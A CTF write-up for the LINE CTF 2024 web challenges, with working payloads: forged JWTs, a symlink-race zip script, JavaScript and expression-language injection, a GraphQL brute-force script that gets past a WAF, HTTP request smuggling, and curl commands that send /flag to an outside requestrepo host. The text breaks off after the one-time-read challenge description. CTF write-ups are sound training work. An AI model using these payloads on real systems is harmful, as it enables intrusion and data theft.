---
title: "zipviewer-version-citizen - LINE CTF 2024"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["web", "symlink", "race-condition", "ecc", "ecdsa", "jwt", "graphql", "cors", "race", "line-ctf", "line-ctf-2024", "2024", "ctf-writeup"]
summary: "Write-ups for the web challenges at LINE CTF 2024."
source:
  name: "CTFtime writeup #39017"
  url: "https://ctftime.org/writeup/39017"
original_source: "https://adragos.ro/line-ctf-2024/#zipviewer-version-citizen"
ctf:
  name: "LINE CTF 2024"
  year: 2024
  challenge: "zipviewer-version-citizen"
---

## Metadata

- **CTF:** LINE CTF 2024
- **Task:** zipviewer-version-citizen
- **Author team:** WreckTheLine
- **CTFtime tags:** web, symlink, race-condition
- **CTFtime:** <https://ctftime.org/writeup/39017>
- **Original writeup:** <https://adragos.ro/line-ctf-2024/#zipviewer-version-citizen>

---
Write-ups for the web challenges at LINE CTF 2024. Great collection of whitebox web challenges.

![](https://adragos.ro/assets/images/posts/line2024.webp)

  * jalyboy-baby (100 pts, 428 solves) - Web
  * jalyboy-jalygirl (100 pts, 189 solves) - Web
  * zipviewer-version-citizen (110 pts, 81 solves) - Web
  * G0tcha-G0tcha-doggy (124 pts, 62 solves) - Web
  * This message will self-destruct in... (145 pts, 43 solves) - Web
  * zipviewer-version-clown (149 pts, 41 solves) - Web
  * graphql-101 (176 pts, 28 solves) - Web
  * Boom Boom Hell* (176 pts, 28 solves) - Web
  * Heritage (233 pts, 15 solves) - Web
  * hhhhhhhref (257 pts, 12 solves) - Web
  * one-time-read (305 pts, 8 solves) - Web
  * auth-internal (341 pts, 6 solves) - Web


## jalyboy-baby (100 pts, 428 solves) - Web

Description:

```
    It's almost spring. I like spring, but I don't like hay fever.
    
    http://34.84.28.50:10000/
```

This is the important part of the provided source code:

```
    @Controller  
    public class JwtController {  
      
        public static final String ADMIN = "admin";  
        public static final String GUEST = "guest";  
        public static final String UNKNOWN = "unknown";  
        public static final String FLAG = System.getenv("FLAG");  
        Key secretKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);  
      
        @GetMapping("/")  
        public String index(@RequestParam(required = false) String j, Model model) {  
            String sub = UNKNOWN;  
            String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(secretKey).compact();  
      
            try {  
                Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);  
                Claims claims = (Claims) jwt.getBody();  
                if (claims.getSubject().equals(ADMIN)) {  
                    sub = ADMIN;  
                } else if (claims.getSubject().equals(GUEST)) {  
                    sub = GUEST;  
                }  
            } catch (Exception e) {  
    //            e.printStackTrace();  
            }  
      
            model.addAttribute("jwt", jwt_guest);  
            model.addAttribute("sub", sub);  
            if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);  
      
            return "index";  
        }  
    }
```

As we can see, the JWT library is only parsing the incoming JWT, not actually verifying that the JWT was hashed with the given secretKey. All we have to do is to set the `alg` to `none` and sub to `admin`, we can use <https://token.dev/> for that:

```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9
```

Which decodes to

```
    Header
    {
      "typ": "JWT",
      "alg": "none"
    }
    Payload
    {
      "sub": "admin"
    }
```

**LINECTF{337e737f9f2594a02c5c752373212ef7}**

## jalyboy-jalygirl (100 pts, 189 solves) - Web

Description:

```
    It's almost spring. Do you like Java?
    
    http://34.85.123.82:10001/
```

This is the new `JwtController.java`, we can compare it to `jalyboy-baby` to more easily find the vulnerability:

```
    @Controller  
    public class JwtController {  
      
        public static final String ADMIN = "admin";  
        public static final String GUEST = "guest";  
        public static final String UNKNOWN = "unknown";  
        public static final String FLAG = System.getenv("FLAG");  
        KeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);  
      
        @GetMapping("/")  
        public String index(@RequestParam(required = false) String j, Model model) {  
            String sub = UNKNOWN;  
            String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(keyPair.getPrivate()).compact();  
            System.out.println(keyPair.getPrivate().getEncoded());  
            System.out.println(keyPair.getPublic());  
      
            try {  
                Jws<Claims> jwt = Jwts.parser().setSigningKey(keyPair.getPublic()).parseClaimsJws(j);  
                Claims claims = (Claims) jwt.getBody();  
                if (claims.getSubject().equals(ADMIN)) {  
                    sub = ADMIN;  
                } else if (claims.getSubject().equals(GUEST)) {  
                    sub = GUEST;  
                }  
            } catch (Exception e) {  
                e.printStackTrace();  
            }  
      
            model.addAttribute("jwt", jwt_guest);  
            model.addAttribute("sub", sub);  
            if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);  
      
            return "index";  
        }  
    }
```

This time the JWT is actually parsed, so the `none` trick will not work anymore. One thing to notice is that this version is using `ES256` instead of the usual `HS256`. This hints at an Elliptic Curve signature forgery. Since we don't have the public key, and the code is statically typed, we can't do the usual `RS256/ES256` to `HS256` (where the public key is used as the secret key for the hash function).

After a bit of researching ECDSA + Java, we find `CVE-2022-21449: Psychic Signatures in Java`, which has a nice PoC here: <https://gist.github.com/righettod/1d2f4498e3dba4fc779036ce83565d68> with the following JWT: `eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJSaWNrIEFzdGxleSIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTA0NjY1MDIsImV4cCI6MTkwMDQ3MDEwMn0.MAYCAQACAQA`

We just need to edit it such that `sub` is set to `admin`

```
    JWT
    eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA
    
    Header 
    {
      "typ": "JWT",
      "alg": "none"
    }
    Payload
    {
      "sub": "admin"
    }
```

**LINECTF{abaa4d1cb9870fd25776a81bbd278932}**

## zipviewer-version-citizen (110 pts, 81 solves) - Web

Description:

```
    Read the flag (/flag)
    
    http://34.84.43.130:11000/
```

We are given a Swift web application where we can upload zips and they will be unzipped on the server. The goal is to read `/flag`, so we just need to create a symlink to `/flag` that we can read.

The most important part of the flow is this:

```
        let file = try req.content.decode(Input.self).data  
        try IsZipFile(data: file)  
        try await req.fileio.writeFile(ByteBuffer(data: file), at: fileName)  
      
        let fileList = try GetEntryListInZipFile(fileName: fileName)  
        _ = try Unzip(filename: fileName, filepath: filePath)  
      
        guard try CleanupUploadedFile(filePath: filePath, fileList: fileList) else {  
            throw Abort(.internalServerError, reason: "Something Wrong")  
        }
```

Where `CleanupUploadedFile` will remove any symlinks that we upload. However there is a race condition, since first the payload is unzipped, and only after that the symlinks are deleted. Which give us a window in which we can read the symlink directly from the web server that will allow us to get the flag.

We can solve this by creating a zip that contains a symlink to `/flag` and then uploading it in a while true. I've also added some empty files to hopefully enlarge the race window:

```
    #!/bin/bash  
    echo "symlink.jpg created"  
    ln -s /flag ./symlink.jpg  
    echo "photos.zip with symlink created"  
    rm photos.zip  
    zip --symlinks photos.zip ./symlink.jpg  
    for i in `seq 1 8`; do echo "" > "$i"; zip photos.zip "$i"; rm "$i"; done
```

Then, we can try to read the flag by accessing the symlink:

```
    while true; do curl -s -X $'GET' \
        -H $'Host: 35.243.120.91:11001' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36' -H $'Accept: */*' -H $'Referer: http://35.243.120.91:11001/viewer' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
        -b $'vapor_session=f7C0Bg7XDgJsQWKZNNDlULuFnO0m5aC+kVNc8XDy/1k=' \
        $'http://35.243.120.91:11001/download/symlink.jpg' | grep -i line; done
```

**LINECTF{af9390451ae12393880d76ea1f6cffc1}**

## G0tcha-G0tcha-doggy (124 pts, 62 solves) - Web

Description:

```
    Please enjoy. if you have a problem when you solve this challenge. Please contact wulfsek.
    
    server:1 http://35.243.76.165:11008/
    
    server:2 http://34.85.97.250:11008/
```

Web service written in Kotlin. The goal is to "guess" the results from the server in order to get the flag image. The server is running two threads, `rouletteA` and `rouletteB`, that are generating random numbers. The random numbers are generated using the `secureRandom` object, which is seeded with the username of the user. The user can also provide a `dateTime` parameter, which is used in the script that generates the random numbers.

However, there is a javascript code injection vulnerability in the `dateTime` parameter. We can inject code that will manipulate the final array of random numbers generated by the server. We can use this to generate a sequence of numbers that will allow us to get the flag.

```
        synchronized(this){  
            rouletteB = thread(false) {  
                val dangerCommands = listOf("java", "eval", "util", "for", "while", "function", "const", "=>" )  
                val isDanger = dangerCommands.any { dateTime.contains(it) }  
                if (isDanger) {  
                    throw CustomException("No Hack")  
                }  
      
                val script = Script.Builder()  
                .script("for(var tempvariable=0;tempvariable<5;tempvariable++){ bonus_number=Math.floor(secureRandom.nextDouble()*value)+1;java.lang.Thread.sleep(2);}")  
                .value(dateTime)  
                .tempVariable( variableBuiler() )  
                .dynamicVariable(StringBuilder().append(variableBuiler()).append(System.currentTimeMillis()).toString())  
                .build()  
                scriptEngineService.setSecureRandomSeed(userName)  
                scriptEngineService.runJS(script.script.toString())  
            }  
      
            rouletteA = thread(false) {  
                val value = dateTime.replace(Regex("^(\\d{1,3}).*"), "$1")  
                val script = Script.Builder()  
                    .script("var end_no=variables.get('end_no');var start_no=variables.get('start_no');var tmp=[];for(var tempvariable=start_no;tempvariable<end_no;tempvariable++){tmp.push(Math.floor(secureRandom.nextDouble()*value)+1);Java.type('java.lang.Thread').sleep(50);}var agent_a_array=JSON.stringify(tmp);")  
                    .value(value)  
                    .tempVariable( variableBuiler() )  
                    .dynamicVariable(StringBuilder().append(variableBuiler()).append(System.currentTimeMillis()).toString())  
                    .build()  
                    scriptEngineService.setSecureRandomSeed(userName)  
                    scriptEngineService.runJS(script.script.toString())  
      
            }  
        }
```

Note that the JavaScript engine is Narwhal, which is a JavaScript engine written in Java. My final payload was:

```
    POST /api/gotcha HTTP/1.1
    Host: 35.243.76.165:11008
    Content-Length: 71
    Access-Control-Allow-Origin: *
    Accept: application/json, text/plain, */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
    Content-Type: application/json
    Origin: http://35.243.76.165:11008
    Referer: http://35.243.76.165:11008/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Connection: close
    
    {"userName":"adragos","userNumbers":[5,5,
    5],"dateTime":"(tmp=[5,5])[0]"}
```

Which will pass the gotChaHack (after some tries, 1/5 chance) and get the flag image:

```
    val gotChaHack : List<Long> = listOf(5,5,5)  
                    val gotChaPark : List<Long> = listOf(6,6,6)  
                    val gotChaKing : List<Long> = listOf(7,7,7)  
                    val gotChaTazza : List<Long> = listOf(8,8,8)  
                    val gotChaMaster : List<Long> = listOf(9,9,9)  
      
                    if( result.userNumbers == gotChaBaby){  
                        resultMessage = "Gotcha baby!"  
                        image = loadImage("flag.jpg")  
                    }else if( result.userNumbers == gotChaHack){  
                        image = loadImage("flag.jpg")  
                        resultMessage = "Gotcha hack"
```

**LINECTF{1c817e624ca6e4875e1a876aaf3466fc}**

## This message will self-destruct in... (145 pts, 43 solves) - Web

Description:

```
    This service can generate message link that will self-destruct. BTW, Which SPY movie do you like? 😎
    
    http://35.200.21.52/
```

Web application written in Python + Flask. The service allows us to create a message that contains an image and a password. The message will be deleted after it is read. We can notice the first suspicious part of the code:

```
    @app.post('/')  
    def add_image():  
        form = AddImageForm()  
      
        print(form)  
      
        if form.validate_on_submit():  
            file = form.image.data  
            password = form.password.data  
            id_ = form.id.data or uuid4().hex  
            image_url = form.image_url.data  
      
            url = __add_image(password, id_, file=file, image_url=image_url)  
      
            return render_template('image_added.html', url=url, form=form)  
        else:  
            logger.info(f'validation error: {form.errors}')  
            return render_template('index.html', form=form)
```

Where the id_ is either the provided id or a random uuid. This is the first vulnerability, as we can reuse an existing id to read the message. The second vulnerability is in the `__add_image` function:

```
    def __add_image(password, id_, file=None, image_url=None, admin=False):  
        t = Thread(target=convert_and_save, args=(id_, file, image_url))  
        t.start()  
      
        # no need, but time to waiting heavy response makes me excited!!  
        if not admin:  
            time.sleep(5)  
      
        if file:  
            mimetype = file.content_type  
        elif image_url.endswith('.jpg'):  
            mimetype = 'image/jpg'  
        else:  
            mimetype = 'image/png'  
      
        db.add_image(id_, mimetype, password)  
      
        return urljoin(URLBASE, id_)
```

So it seems that the image is saved in a separate thread, and the function waits for 5 seconds before inserting the data into the database. This is the convert_and_save function:

```
    def convert_and_save(id, file=None, url=None):  
        try:  
            if url:  
                res = requests.get(url, timeout=3)  
                image_bytes = res.content  
            elif file:  
                image_bytes = io.BytesIO()  
                file.save(image_bytes)  
                image_bytes = image_bytes.getvalue()  
      
            if len(image_bytes) > app.config['MAX_CONTENT_LENGTH']:  
                raise Exception('image too large')  
      
            obfs_image_bytes = util.mosaic(image_bytes)  
      
            with open(os.path.join(FILE_SAVE_PATH, id), 'wb') as f:  
                f.write(image_bytes)  
            with open(os.path.join(FILE_SAVE_PATH, id+'-mosaic'), 'wb') as f:  
                f.write(obfs_image_bytes)  
        except Exception as e:  
            logger.error(f'convert_and_save: rollback: {e}')  
            db.delete_image(id)  
            try:  
                os.remove(os.path.join(FILE_SAVE_PATH, id))  
            except:  
                pass  
            try:  
                os.remove(os.path.join(FILE_SAVE_PATH+'-mosaic', id))  
            except:  
                pass
```

It seems that if it fails, then the image is deleted and the database entry is removed. While not ideal, we can use this to our advantage.

To get the flag, we need to call the /trial endpoint:

```
    @app.get('/trial')  
    def trial():  
        with open(TRIAL_IMAGE, 'rb') as f:  
            file = FileStorage(stream=f, content_type='image/png')  
            url = __add_image(  
                secrets.token_urlsafe(32),  
                uuid4().hex,  
                file=file,  
                admin=True  
            )  
        return jsonify({'url': url})
```

And if we view it, it will call the hidden_image function:

```
    @app.get('/<id>')  
    def hidden_image(id:str):  
        result = db.get_image(id)  
        if result:  
            with open(os.path.join(FILE_SAVE_PATH, id+'-mosaic'), 'rb') as f:  
                data = f.read()  
      
            image_data_url = util.image_data2url(result[1], data)  
            Timer(DESTRUCTION_SECONDS, db.delete_image, args=(id,)).start()  
            return render_template('hidden_image.html', data_url=image_data_url, destruction_seconds=DESTRUCTION_SECONDS)  
        else:  
            logger.info(f'image not found: {id}')  
            return render_template('imposter.html')
```

It's important to note that the destruction only deletes the image from the database, not the actual image file. We can use this to our advantage to get the flag.

Our payload will look like:

  1. Get the trial image from /trial
  2. Access the trial image from /, which will remove the entry from the database but not the image file
  3. Reuse the id to access the image file directly, with an URL we control such that `res = requests.get(url, timeout=3)` takes more than 5 seconds. We can do that because this is specified in the documentation:


```
    If you specify a single value for the timeout, like this:
    
    r = requests.get('https://github.com', timeout=5)
    The timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately:
```

I did it using a netcat connection on my server, and just sending data every few seconds. 4. After 5 seconds, our new post will be inserted in the database, but the file will not be overwritten, so we can access the flag image.

Payload code:

```
    import requests  
    import time  
      
    t = requests.get("http://35.200.21.52:80/trial")  
    id = t.json()['url'].split('/')[-1]  
      
    t = requests.get("http://35.200.21.52:80/"+id)  
      
    time.sleep(10)  
      
    burp0_url = "http://35.200.21.52:80/"  
    burp0_data = {"image_url": "http://rasp.go.ro:4444/a.png", "id": id, "password": "kek"}  
    r = requests.post(burp0_url, data=burp0_data)  
      
    burp0_data = {"password": "kek"}  
    r = requests.post(burp0_url+id, data=burp0_data)  
      
    print(r.text)
```

**LINECTF{db3b30d05eb5e625a50a3925a35810f2}**

## zipviewer-version-clown (149 pts, 41 solves) - Web

Description:

```
    Read the flag (/flag)
    
    http://35.243.120.91:11001/
```

Same as `zipviewer-version-citizen`, but this time the server has some stricter rate-limiting measures on /upload and /download:

```
    		location /upload {
                proxy_pass http://webapp;
    
    			limit_req zone=updown_limit burst=3;
    			limit_req_status 429;
                limit_req_log_level error;
    
                access_log /var/log/nginx/access.log combined;
    
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
            }
    
    		location /download {
                proxy_pass http://webapp;
    
    			limit_req zone=updown_limit burst=3;
    			limit_req_status 429;
                limit_req_log_level error;
    
                access_log /var/log/nginx/access.log combined;
    
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
            }
        }
```

How I solved it, is that nginx routes are case sensitive, but Swift is not. So we can use the `/UpLoAd`, `/downlOad` (and variations of them) endpoints to bypass the rate limiting. The rest of the exploit is the same as `zipviewer-version-citizen`. I also got a VPS in Japan to be closer to the server, and just used this curl command to get the flag:

```
    while true; do curl -i -s -k -X $'GET'     -H $'Host: 35.243.120.91:11001' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36' -H $'Accept: */*' -H $'Referer: http://35.243.120.91:11001/viewer' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Connection: close'     -b $'vapor_session=f7C0Bg7XDgJsQWKZNNDlULuFnO0m5aC+kVNc8XDy/1k='     $'http://35.243.120.91:11001/dOwnload/symlink.jpg' ; done
```

**LINECTF{34d98811f9f20094d1cc75af9299e636}**

## graphql-101 (176 pts, 28 solves) - Web

Description:

```
    Hello, I've just learned graphql by following tutorial of express graphql server. I hope nothing goes wrong.
    
    http://34.84.220.22:7654/
    
    If your exploit works locally, but doesn't work in real, please consider to use another external IP (such as a remote VM).
```

This is a simple GraphQL server written in Express. The goal is to get the OTP for all 40 users. The server is using a simple in-memory database to store the users and their OTPs. The important part of the code is:

```
    const STRENGTH_CHALLENGE = 999;  
    const NUM_CHALLENGE = 40;  
    const ERROR_MSG = "Wrong !!!";  
    const CORRECT_MSG = "OK !!!";  
      
    // Currently support admin only  
    var otps = Object.create(null);  
    otps["admin"] = Object.create(null);  
    function genOtp(ip, force = false) {  
      if (force || !otps["admin"][ip]) {  
        function intToString(v) {  
          let s = v.toString();  
          while (s.length !== STRENGTH_CHALLENGE.toString().length) s = '0' + s;  
          return s;  
        }  
        const otp = [];  
        for (let i = 0; i < NUM_CHALLENGE; ++i)   
          otp.push(  
            intToString(crypto.randomInt(0, STRENGTH_CHALLENGE))  
          );  
        otps["admin"][ip] = otp;  
      }  
    }  
      
    const rateLimiter = require('express-rate-limit')({  
      windowMs: 30 * 60 * 1000,  
      max: 5,  
      standardHeaders: true,  
      legacyHeaders: false,  
      onLimitReached: async (req) => genOtp(req.ip, true)  
    });  
      
    function checkOtp(username, ip, idx, otp) {  
      if (!otps[username]) return false;  
      if (!otps[username][ip]) return false;  
      return otps[username][ip][idx] === otp;  
    }
```

So we only have 1000 * 40 requests that we need to make in order to get the flag. The server also has a waf that will block suspicious requests:

```
    // Secure WAF !!!!  
    const { isDangerousPayload, isDangerousValue } = require('./waf');  
    app.use((req, res, next) => {  
      if (isDangerousValue(req.url)) return res.send(ERROR_MSG);  
      if (isDangerousPayload(req.query)) return res.send(ERROR_MSG);  
      next();  
    });  
      
    // waf.js  
    function isDangerousValue(s) {  
      return s.includes('admin') || s.includes('\\'); // Linux does not need to support "\"  
    }  
      
    /** Secured WAF for admin on Linux  
    */  
    function isDangerousPayload(obj) {  
      if (!obj) return false;  
      const keys = Object.keys(obj);  
      for (let i = 0; i < keys.length; ++i) {  
        const key = keys[i];  
        if (isDangerousValue(key)) return true;  
        if (typeof obj[key] === 'object') {  
          if (isDangerousPayload(obj[key])) return true;  
        } else {  
          const val = obj[key].toString();  
          if (isDangerousValue(val)) return true;  
        }  
      }  
      return false;  
    }  
      
    module.exports = {  
      isDangerousValue,  
      isDangerousPayload,  
    }
```

The solution is to use batched graphql queries. That allows us to send 200 queries in a single request. To bypass the waf we need to use the variables in graphql. The nice thing is that we can send the query in a GET request, but the variables in a POST request. This way we can bypass the waf and brute 1000 codes in 5 requests. Also, when we get a code right it resets the rate limiting, allowing us to brute force the code for the next user.

This is my solve script:

```
    import requests  
      
    def gen(idx):  
      for j in range(5):  
        yield ','.join([f'otp{i}:otp(u:$a,i:{idx},otp:"{str(i).zfill(3)}")' for i in range(200*j, 200*(j+1))])  
      
    for idx in range(40):  
      for data in gen(idx):  
        burp0_url = "http://34.84.220.22:7654/graphql?query=query+adragos($a:String!){"+data+"}"  
        burp0_json={"variables": {"a": "admin"}}  
        r = requests.post(burp0_url, json=burp0_json, proxies={'http': 'http://127.0.0.1:8080'})  
        if 'OK' in r.text:  
          print(idx)  
          break  
      
    print("Exploit done")
```

After the script is finished, we can go to `/Admin` (notice the capital A, to bypass the waf) and get the flag.

**LINECTF{db37c207abbc5f2863be4667129f70e0}**

## Boom Boom Hell* (176 pts, 28 solves) - Web

Description:

```
    Shall we dance? 🐻🐥🐰🎶
    
    URL: http://34.146.180.210:3000/chall?url=https://www.lycorp.co.jp
```

This is all the challenge code:

```
    import {$, escapeHTML} from "bun";  
    import qs from "qs";  
      
    const port = process.env.PORT || 3000;  
    const logFile = process.env.LOGFILE || ".log";  
      
    const server = Bun.serve({  
        host: "0.0.0.0",  
        port: port,  
        async fetch(req) {  
            const url = new URL(req.url);  
            if (url.pathname === "/chall") {  
                const params = qs.parse(url.search, {ignoreQueryPrefix: true});  
                if (params.url.length < escapeHTML(params.url).length) {    // dislike suspicious chars  
                    return new Response("sorry, but the given URL is too complex for me");  
                }  
      
                const lyURL = new URL(params.url, "https://www.lycorp.co.jp");  
                if (lyURL.origin !== "https://www.lycorp.co.jp") {  
                    return new Response("don't you know us?");  
                }  
      
                const rawFetched = await $`curl -sL ${lyURL}`.text();  
                const counts = {  
                    "L": [...rawFetched.matchAll(/LINE/g)].length,  
                    "Y": [...rawFetched.matchAll(/Yahoo!/g)].length,  
                }  
                await $`echo $(date '+%Y-%m-%dT%H:%M:%S%z') - ${params.url} ::: ${JSON.stringify(counts)} >> ${logFile}`;  
      
                const highlighted = escapeHTML(rawFetched)  
                    .replace(/LINE/g, "<mark style='color: #06C755'>$&</mark>")  
                    .replace(/Yahoo!/g, "<mark style='color: #FF0033'>$&</mark>");  
                const html = `  
                    <h1>Your score is... 🐐<${counts.L + counts.Y}</h1>  
                    <details open>  
                        <summary>Result</summary>  
                        <blockquote>${highlighted}</blockquote>              
                    </details>  
                `;  
                return new Response(html, {headers: {"Content-Type": "text/html; charset=utf-8"}});  
            } else {  
                return new Response("🎶😺≡≡≡😺🎶 Happy Happy Happy~")  
            }  
        }  
    });  
      
    console.log(`😺 on http://localhost:${server.port}`);
```

The goal is to read `/flag`. One imporant thing to consider is that the server is using Bun, which has a custom implementation for shell commands.

The **intended** solution is to create an object that has a `raw` attribute, which will bypass Bun's shell command escaping. We can do that by creating a URL that has a `raw` attribute, and then exfil the flag using `curl`. The final payload will look like:

```
    http://34.146.180.210:3000/chall?url[raw]=$(curl 06sjnkhn.requestrepo.com -F=@/flag)
```

However, we found an **unintended** solution, which turned out to be a Bun 0-day :). ~~I will update the write-up once the vulnerability is patched.~~ You can read the poc in this write-up, as the same idea was used in HITCON CTF 2024: https://xz.aliyun.com/t/15130?time__1311=GqjxuQD%3Deewxl2%2BGkQDObQF84fO4DuWmD&u_atoken=960e90152eea3d0d255d7bcd7dc2c1f2&u_asig=0a472f8317324115276187210e006f

We also found a 0-day bug in [escapeHTML](https://bun.sh/blog/bun-v1.0.36#fixed-crash-using-bun-escapehtml), which could've been used to DoS the server.

**LINECTF{db37c207abbc5f2863be4667129f70e0}**

## Heritage (233 pts, 15 solves) - Web

Description:

```
    http://35.200.117.55:20080/
```

Cool challenge written in Java with Spring. We are given an internal app and a gateway that will proxy our requests to the internal app.

The vulnerable part of the code is in the `/api/internal` of the internal app:

```
    public class NameValidator implements ConstraintValidator<ValidateName, String> {  
        private static final String REGEX_NAME = "^[a-f\\d]{32}$";  
        private static final Pattern PATTERN = Pattern.compile(REGEX_NAME);  
      
        @Override // javax.validation.ConstraintValidator  
        public boolean isValid(String value, ConstraintValidatorContext context) {  
            if (StringUtils.isEmpty(value) || PATTERN.matcher(value).matches()) {  
                return true;  
            }  
            context.buildConstraintViolationWithTemplate(String.format("%s", value)).addConstraintViolation();  
            return false;  
        }  
    }
```

Where buildConstraintViolationWithTemplate is vulnerable to [server side template injection](https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/). We can get a payload from [hacktricks](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md), and we confirm that it works.

Now, the challenge is to actually send the payload to the internal app. We can't do that directly, as the internal app is only accessible from the gateway. We can use the gateway to send the payload to the internal app. I saw that the gateway was using `spring-cloud-gateway-core-2.1.1`, and that there is a CVE that applies to future versions which is related to [request injection](https://github.com/advisories/GHSA-2r2v-q399-qq93). So I crafted a payload using `Transfer-encoding: chunked` to send the payload to the internal app, and it worked!

Payload:

```
    PUT /api/external HTTP/1.1
    Host: localhost:8080
    Content-Type: application/json
    Connection: close
    Transfer-encoding:  chunked
    
    11e
    POST /api/internal/ HTTP/1.0
    Host: localhost
    Content-Type: application/json
    Content-Length: 180
    
    {"name":"${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"curl -d@/FLAG 06sjnkhn.requestrepo.com\")}"}
    0
```

**LINECTF{7988de328384f8a19998923a87aa053f}**

## hhhhhhhref (257 pts, 12 solves) - Web

Description:

```
    Are they specifications or are they vulnerabilities? What do you think?
    
    http://34.146.31.52:3000/
```

We are given a web application written in next.js, the goal is to get the flag from the admin bot. As we can see:

```
    // crawl with provided code  
    await page.setExtraHTTPHeaders({  
        "X-LINECTF-FLAG": process.env.FLAG  
    });  
    await page.goto(`${process.env.NEXTAUTH_URL}/rdr?errorCode=${code}`);  
    await delay(1500);
```

The bot sets the `X-LINECTF-FLAG` header, so we don't have to get XSS, an open redirect in the `/rdr` endpoint will suffice. But before that:

```
    // login  
    await page.goto(`${process.env.NEXTAUTH_URL}/api/auth/signin?callbackUrl=/`);  
    await page.type("#input-name-for-credentials-provider", username);  
    await page.type("#input-password-for-credentials-provider", password);
```

The admin logs in with the username and password that **we provide** , which will be important later. Looking at the `/rdr` endpoint:

```
    const session = await getServerSession(ctx.req, ctx.res, nextAuthOptions);  
    if (!session || !session.user) {  
        return {  
            redirect: {  
                permanent: false,  
                destination: '/error/403',  
            },  
            props: {},  
        };  
    }  
    const userData = await redis.hgetall(session.user.userId);  
    redis.disconnect();  
      
    // are you ADMIN?  
    if (  
        userData.userRole === 'ADMIN' &&  
        userData.adminSecretToken === process.env.ADMIN_SECRET_TOKEN  
    ) {  
        return { props: { errorCode: errorCode } };  
    }  
      
    // are you USER?  
    if (userData.userRole === 'USER' && Object.keys(userData).length === 3) {  
        return {  
            redirect: {  
                permanent: false,  
                destination: '/error/403',  
            },  
            props: {},  
        };  
    } else {  
        return { props: { errorCode: errorCode } };  
    }
```

We see that the server is taking the session from the cookie, and it checks with redis for the user permissions. However there's also a `logout` functionality:

```
    async function clear(req: any, res: any) {  
        const session = await getServerSession(req, res, nextAuthOptions);  
      
        if (!session) {  
            return res.status(200).end();  
        }  
      
        if (!session.user) {  
            return res.status(500).end();  
        }  
      
        const redis = new Redis(6379, 'redis');  
        await redis.del(session.user.userId);  
        redis.disconnect();  
        return res.status(200).end();  
    }
```

Which will delete the id from redis. So because of how the rdr code is setup, if we have a valid cookie, but an invalid id, it will be the same as if we are `admin`. And that is what we want. So we have a "race" like so: login with our credentials, send admin to login with our credentials, and then logout from our account.

After that, the admin bot goes to the `/rdr` endpoint as if it had an admin session. Now we need to look for an open redirect in the `/rdr` endpoint.

```
    export default function Rdr(props: any) {  
        const handler = () => {  
            const newUrl = document.getElementsByClassName(  
                'redirect_url'  
            )[0] as HTMLAnchorElement;  
            window.location.href = newUrl.href;  
        };  
      
        useEffect(() => {  
            setTimeout(() => {  
                handler();  
            }, 500);  
      
        }, []);  
      
        return (  
            <>  
                <Head>  
                    <title>Create Next App</title>  
                    <meta  
                        name="description"  
                        content="Generated by create next app"  
                    />  
                    <meta  
                        name="viewport"  
                        content="width=device-width, initial-scale=1"  
                    />  
                    <link rel="icon" href="/favicon.ico" />  
                </Head>  
                <h1>Redirect page</h1>  
                <main>  
                    <div>  
                        <p>HELLO</p>  
                    </div>  
      
                    <Link  
                        href={{  
                            pathname: `/report/error/${props.errorCode}`,  
                        }}  
                        className="redirect_url"  
                        target="_blank"  
                    >  
                        You are going to jump...  
                    </Link>  
                </main>  
            </>  
        );  
    }
```

So this is server-side React, and our error will be passed to `${props.errorCode}`. We will abuse the href functionality of React, because if we use `../../` we can get to `/`, then if we use whitespace we can force an invalid path that will get stripped, but that still starts with `/`, and then we can use `//` to force the href to redirect to our server, because the browser will interpret a link that starts with `//` as an absolute path on the same protocol. So the final payload will look like:

```
    GET /rdr?errorCode=../../%0d%0a/06sjnkhn.requestrepo.com HTTP/1.1
```

We just have to get the race condition right, and we can get the flag.

**LINECTF{7320a1b512380dd4e0452f9fc3166201}**

## one-time-read (305 pts, 8 solves) - Web

Description:

```
    Please make sure that your exploit can work on local environment perfectly before submitting it to the real server to avoid spamming!
    
    One Time Read is an internal tool to store some secret messages as a note. Note is protected with passcode and will be immediately deleted after you read it. How secure!
    
    Internal addresses:
    
    Internal note: http://msg.line.ctf
    
    Report page: http://bot.line.ctf
    
    Bot Public URL:
    
    server1: http://34.84.238.214/
    
    server2: http://34.85.53.84/
```

